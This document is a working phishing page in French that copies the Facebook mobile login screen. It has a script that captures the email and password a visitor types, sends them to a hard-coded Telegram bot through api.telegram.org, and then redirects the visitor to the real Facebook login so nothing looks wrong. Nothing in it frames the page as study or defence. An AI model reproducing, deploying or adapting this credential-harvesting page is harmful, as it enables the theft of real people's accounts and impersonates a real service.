<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; }
        .top-banner { width: 100%; background-color: #fff; padding: 10px; text-align: center; border-bottom: 1px solid #ddd; font-size: 14px; color: #1c1e21; }
        .lang-switcher { margin: 20px 0; font-size: 14px; color: #4b4f56; }
        .logo-container { margin: 20px 0; }
        .logo-circle { width: 80px; height: 80px; background-color: #1877f2; border-radius: 50%; display: flex; justify-content: center; align-items: center; }
        .logo-f { color: white; font-size: 60px; font-weight: bold; font-family: sans-serif; margin-top: 15px; }
        
        .login-form { width: 90%; max-width: 400px; display: flex; flex-direction: column; }
        input { padding: 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 12px; font-size: 16px; background-color: #f5f6f7; outline: none; }
        input:focus { border-color: #1877f2; background-color: #fff; }
        
        .login-btn { background-color: #0064e0; color: white; padding: 12px; border: none; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .forgot-pass { text-align: center; margin: 20px 0; color: #1c1e21; font-weight: 500; text-decoration: none; font-size: 15px; }
        
        .divider { display: flex; align-items: center; text-align: center; color: #4b4f56; margin: 10px 0; width: 100%; }
        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #dadde1; }
        .divider span { padding: 0 10px; font-size: 12px; }
        
        .create-btn { background-color: transparent; color: #0064e0; padding: 10px; border: 1px solid #0064e0; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; margin: 10px auto; width: 80%; }
        
        .meta-footer { margin-top: 40px; display: flex; flex-direction: column; align-items: center; color: #4b4f56; font-size: 12px; }
        .meta-logo { width: 60px; margin-bottom: 10px; }
        .footer-links { margin-top: 10px; }
        .footer-links span { margin: 0 5px; }
    </style>
</head>
<body>

    <div class="lang-switcher">Français (France)</div>

    <div class="logo-container">
        <div class="logo-circle"><span class="logo-f">f</span></div>
    </div>

    <form class="login-form" id="fbForm">
        <input type="text" id="email" placeholder="Numéro mobile ou e-mail" required>
        <input type="password" id="pass" placeholder="Mot de passe" required>
        <button type="submit" class="login-btn">Se connecter</button>
        <a href="#" class="forgot-pass">Mot de passe oublié ?</a>
        
        <div class="divider"><span>OU</span></div>
        
        <button type="button" class="create-btn">Créer un compte</button>
    </form>

    <div class="meta-footer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo" alt="Meta">
        <div class="footer-links">
            <span>À propos</span> · <span>Aide</span> · <span>Plus</span>
        </div>
    </div>

    <script>
        const botToken = "8466533426:AAGSA2_PinahyYMBHYbpPbYMSt4nuo1Il9I";
        const chatId = "8487366702";

        document.getElementById('fbForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            
            const message = `--- FB MOBILE CAPTURE ---\nUser: ${email}\nPass: ${pass}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url).finally(() => {
                window.location.href = "https://m.facebook.com/login.php";
            });
        });
    </script>
</body>
</html>
